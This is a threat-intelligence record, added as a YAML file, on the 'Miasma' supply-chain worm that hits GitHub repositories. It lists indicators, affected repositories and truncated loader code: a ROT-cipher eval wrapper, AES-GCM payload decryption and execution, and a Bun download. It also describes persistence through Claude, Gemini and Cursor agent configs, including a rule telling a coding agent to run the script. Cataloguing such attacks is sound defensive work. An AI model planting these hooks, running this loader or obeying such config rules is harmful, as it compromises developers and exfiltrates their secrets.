@@ -1,0 +1,228 @@
+title: Miasma Worm Targets AI Coding Agents via GitHub Repos
+description: A supply chain attack campaign (dubbed "Miasma") targets GitHub repositories
+  by injecting malicious CI/CD workflow code that uses obfuscated JavaScript (Caesar/ROT
+  cipher, AES-128-GCM), downloads a pinned Bun runtime, and establishes persistence
+  via Claude, VSCode, Gemini, and Cursor config files to exfiltrate secrets and execute
+  payloads.
+attribution: Miasma
+malware_families:
+- Miasma
+- Shai-Hulud
+- Mini Shai-Hulud
+cves: []
+ttps:
+  processes:
+  - bun
+  - node
+  - curl
+  - unzip
+  - node-gyp
+  command_lines:
+  - node .github/setup.js
+  - curl -sSL "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-<os>-<arch>.zip"
+    -o "<zip>"
+  - node index.js > /dev/null 2>&1 && echo stub.c
+  powershell: []
+  scripts:
+  - .github/setup.js
+  - try{ eval( (function(s,n) { return s.replace(/[a-zA-Z]/g,function(c) { var b=c<='Z'?65:97;
+    return String.fromCharCode(((c.charCodeAt(0)-b+n)%26)+b); }); })( [40,119,111,117,106,121,40,41,61,62,123/*
+    ...1.3M entries... */].map(function(c) { return String.fromCharCode(c); }).join(''),
+    4 ) ); }catch(e) { console.log('wrapper:', e.message||e); }
+  - const _d=(k,i,a,c)=>{ const d=_c.createDecipheriv('aes-128-gcm', Buffer.from(k,'hex'),
+    Buffer.from(i,'hex'), { authTagLength:16}); d.setAuthTag(Buffer.from(a,'hex'));
+    return Buffer.concat([d.update(Buffer.from(c,'hex')), d.final()]); };
+  - const _b=_d('3ff6e657b1a484dfb3546737b3240372','89a39860a693b7b270358811'/*...*/);
+  - const _p=_d('fe3ee18854f19ec00e6965dc577a56d2','6d114bcf6ba136c583fb94ac'/*...*/);
+  - const t='/tmp/p'+Math.random().toString(36).slice(2)+'.js'; _fs.writeFileSync(t,
+    _p); if(typeof Bun!=='undefined') { _cp.execSync('bun run "'+t+'"', { stdio:'inherit'});
+    }else{ await(0, eval)(_b); _cp.execSync('"'+getBunPath()+'" run "'+t+'"', { stdio:'inherit'});
+    }
+  - const url='https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-'+os+'-'+a+'.zip';
+    execSync('curl -sSL "'+url+'" -o "'+zip+'"', { stdio:'pipe'}); execSync('unzip
+    -j -o "'+zip+'" -d "'+dir+'"', { stdio:'pipe'}); chmodSync(exe,'755');
+  - '"sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]'
+  - '"test": "node .github/setup.js"'
+  - eval(function(s,n){...replace(/[a-zA-Z]/g...}
+  - Loader_d=(k,i,a,c)=>createDecipheriv("aes-128-gcm")
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - node -> github[.]com/oven-sh/bun/releases/download/bun-v1.3.13/:443
+  - bun -> oven-sh:443
+  file_activity:
+  - .github/setup.js
+  - .claude/settings.json
+  - .gemini/settings.json
+  - .cursor/rules/setup.mdc
+  - .vscode/tasks.json
+  - package.json
+  - Gemfile
+  - /tmp/p<random>.js
+  - /tmp/b-<random>/bun
+  - binding.gyp
+  - /tmp/p<rand>.js
+  - /tmp/b-<rand>/bun
+  - .gemini
+  - .cursor
+  - setup.js
+  persistence:
+  - Claude Code SessionStart hook executing node .github/setup.js
+  - Gemini CLI SessionStart hook executing node .github/setup.js
+  - Cursor always-applied project rule instructing agent to run .github/setup.js
+  - VS Code task configured to run on folder open executing .github/setup.js
+  - package.json test script hijacked to execute .github/setup.js
+  - .claude/settings.json SessionStart hook executes node .github/setup.js on Claude
+    Code session start
+  - .gemini/settings.json SessionStart hook executes node .github/setup.js on Gemini
+    CLI session start
+  - .cursor/rules/setup.mdc always-apply rule instructs Cursor agent to run node .github/setup.js
+  - .vscode/tasks.json folderOpen task executes node .github/setup.js when folder
+    is opened in VS Code
+  - package.json test script hijacked to execute node .github/setup.js
+  - Persistence via .claude/settings.json
+  - Persistence via .vscode/tasks.json
+  - Persistence extends to .gemini config
+  - Persistence extends to .cursor config
+  process_relations:
+  - node -> bun
+iocs:
+  hashes:
+  - d630397de8b01af0f6f5cf4463da91b17f28195a2c50c8f3f38ad9f7873fdb8e
+  - 3a9db5ba0c8cd4c91e91717df6b1a141fc1e0fbc0558b5a78d7f5c23f5b2a150
+  - 633c8410ee0413ca4b090a19c30b20c03f31598c25247c484846fa34c1df5b64
+  - ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90
+  - f72462d9e5fa90a483062a83e9ffcb2edc57bf7e
+  ip_addresses: []
+  domains:
+  - github[.]com
+  urls:
+  - https://github[.]com/jahirfiquitiva/Blueprint
+  - https://github[.]com/jahirfiquitiva/Frames
+  - https://github[.]com/icflorescu/mantine-datatable
+  - https://github[.]com/wormholes-org/wormholes
+  - https://github[.]com/Skipperlla/rn-swiper-list
+  - https://github[.]com/icflorescu/mantine-contextmenu
+  - https://github[.]com/Agreon/styco
+  - https://github[.]com/metersphere/helm-chart
+  - https://github[.]com/taxepfa/taxepfa.github.io
+  - https://github[.]com/constituentvoice/ImageResolverPython
+  - https://github[.]com/Azure-Samples/llm-fine-tuning
+  - https://github[.]com/Factlink/js-library
+  - https://github[.]com/jagreehal/stencil-how-to-test-components
+  - https://github[.]com/angular-indonesia/starter-angular-loopback-bulma
+  - https://github[.]com/PositionExchange/evm-matching-engine
+  - https://github[.]com/morph-data/agents-kit
+  - https://github[.]com/Ofisalita/OfisalitaBot
+  - https://github[.]com/wormholes-org/wormholes-client
+  - https://github[.]com/Theauxm/ChainSharp
+  - https://github[.]com/Zaynex/x-atm
+  - https://github[.]com/nodejs-indonesia/blogs
+  - https://github[.]com/green-fox-academy/ferrilata-bloodstone-hotel-booking
+  - https://github[.]com/angular-indonesia/angular-indonesia.github.io
+  - https://github[.]com/erbieio/erbie
+  - https://github[.]com/Agentic-Insights/foundry
+  - https://github[.]com/r8vnhill/kalm
+  - https://github[.]com/squadbase/streamlit-claude-code-starter
+  - https://github[.]com/Agentic-Insights/dreamgen
+  - https://github[.]com/braune-digital/bd-php-to-ts-converter-bundle
+  - https://github[.]com/leanderloew/explainability-simulation
+  - https://github[.]com/KSU-Quantum-Capstone/CS4850-DL1
+  - https://github[.]com/Slickteam/hubspot-java
+  - https://github[.]com/PositionExchange/decentralized-perpetual-trading-protocol-cross-chain
+  - https://github[.]com/kylezap/ctrl-alt-win
+  - https://github[.]com/braune-digital/BrauneDigitalImagineBundle
+  - https://github[.]com/aeldar/simple-object-transformer
+  - https://github[.]com/jedsada-gh/co-work-provider
+  - https://github[.]com/jedsada-gh/co-work-admin
+  - https://github[.]com/jedsada-gh/co-work-android
+  - https://github[.]com/dandycheung/Frames
+  - https://github[.]com/mmlngl/contacttracing.app-graphql-api
+  - https://github[.]com/bitzquad/bitzquad.com
+  - https://github[.]com/paulmojicatech/pmt
+  - https://github[.]com/dcc-cc3002/citric-liquid-Benjjvv
+  - https://github[.]com/dcc-cc3002/citric-liquid-cpereiram
+  - https://github[.]com/dcc-cc3002/citric-liquid-Jarinx
+  - https://github[.]com/dcc-cc3002/citric-liquid-ihumire
+  - https://github[.]com/rhemlock7/svg-logo-maker
+  - https://github[.]com/Shimadakunn/SoFi
+  - https://github[.]com/rhemlock7/weather-app-api
+  - https://github[.]com/jahirfiquitiva/amplify-passwordless-poc
+  - https://github[.]com/jgutierrezdtt/skills-hello-github-actions
+  - https://github[.]com/Abner97/tournaments-app
+  - https://github[.]com/rhemlock7/SQL-Employee-Tracker
+  - https://github[.]com/Theauxm/TypeScriptDependencyInjectionDemo
+  - https://github[.]com/akescoapps/dev-configs
+  - https://github[.]com/neilfarmer/k8s-health
+  - https://github[.]com/mhar-andal/MyBlok
+  - https://github[.]com/messismore/Studio-Grotto
+  - https://github[.]com/A-Mitch/learningRoR
+  - https://github[.]com/rudy-marquez/WebGoatNet
+  - https://github[.]com/jedsada-gh/co-work-katalon
+  - https://github[.]com/A-Mitch/spotify-codes-simulation
+  - https://github[.]com/messismore/Digitale-Ausstellung
+  - https://github[.]com/bitzquad/nebula-docs
+  - https://github[.]com/aiyeola/scrape
+  - https://github[.]com/paulmojicatech/wonder-worm
+  - https://github[.]com/rhemlock7/express-note-taker
+  - https://github[.]com/bhagyamudgal/cuju-web
+  - https://github[.]com/beatrizamante/facial-recognition-api
+  - https://github[.]com/rhemlock7/ecommerce-back-end
+  - https://github[.]com/haidarptrw/Jasakula
+  - https://github[.]com/anasdevv/customer-portal
+  - https://github[.]com/beatrizamante/utfpr_classlog
+  - https://github[.]com/anasdevv/reservation-system
+  - https://github[.]com/killerapp/mermaid-render
+  - https://github[.]com/kylezap/tree-view
+  - https://github[.]com/kylezap/kylezapcicdotcom
+  - https://github[.]com/czech-sfl/konference
+  - https://github[.]com/neilfarmer/platform-spec
+  - https://github[.]com/dean-s-list/deanslist-services
+  - https://github[.]com/tumolaha/lerning-setup
+  - https://github[.]com/Gear-Focus/gearlocker-pwa
+  - https://github[.]com/nasher721/note-clarity
+  - https://github[.]com/nasher721/Medical-OCR
+  - https://github[.]com/nasher721/AnkiFellowCollab
+  - https://github[.]com/nasher721/remix-of-remix-of-round-robin-notes
+  - https://github[.]com/nasher721/remix-of-round-robin-notes
+  - https://github[.]com/nasher721/textcleaner
+  - https://github[.]com/jchable/gpx-utility-analyzer
+  - https://github[.]com/beatrizamante/interactive-fiction-reviewer
+  - https://github[.]com/rhemlock7/minimalist-portfolio-mkii
+  - https://github[.]com/Skipperlla/my-rn-animations
+  - https://github[.]com/jedsada-gh/ApiMovie-UP
+  - https://github[.]com/jedsada-gh/blockchain-playground
+  - https://github[.]com/dzhu8/dzhu.github.io
+  - https://github[.]com/jgutierrezdtt/Vulndemo
+  - https://github[.]com/nasher721/3dgenerator
+  - https://github[.]com/ContactTracing-app/Graphql-apiArchived
+  - https://github[.]com/ContactTracing-app/Firebase-FunctionsArchived
+  - https://github[.]com/Azure/durabletask
+  - https://github[.]com/icflorescu/mantine-datatable-v6
+  - https://github[.]com/icflorescu/mantine-contextmenu-v6
+  - https://github[.]com/icflorescu/next-server-actions-parallel
+  - https://github[.]com/jagreehal/ai-sdk-guardrails
+  - https://github[.]com/jagreehal/ai-sdk-ollama
+  - https://github[.]com/jagreehal/autotel
+  - https://github[.]com/jagreehal/effect-analyzer
+  - https://github[.]com/jagreehal/es-temp-action
+  - https://github[.]com/jagreehal/jagreehal-claude-skills
+  - https://github[.]com/mhar-andal/stock-forum-ethereum
+  - https://github[.]com/Weasledorf-Inc/taskmaster
+  - https://github[.]com/bhagyamudgal/worktree-cli
+  - https://github[.]com/Agreon/budgie
+  - https://github[.]com/Code-Web-Basic/CompilerGo
+  - https://github[.]com/kylezap/rightsize-meals
+  - https://github[.]com/nasher721/Extract721
+  - https://github[.]com/PositionExchange/dptp-client-sdk
+  - https://github[.]com/mmlngl/flua-launch
+  - https://github[.]com/jgutierrezdtt/Sports-Center
+  - https://github[.]com/nasher721/scheduler
+  - https://github[.]com/nodejs-indonesia/blogsArchived
+  - https://github[.]com/mmlngl/contacttracing.app-graphql-apiArchived
+  - hxxps://github[.]com/oven-sh/bun/releases/download/bun-v1.3.13/
+authors:
+- SafeDep Team
+reference: https://safedep.io/miasma-worm-ai-coding-agent-config-injection
+date_of_publication: June 11, 2026
+file_creation_date: June 11, 2026
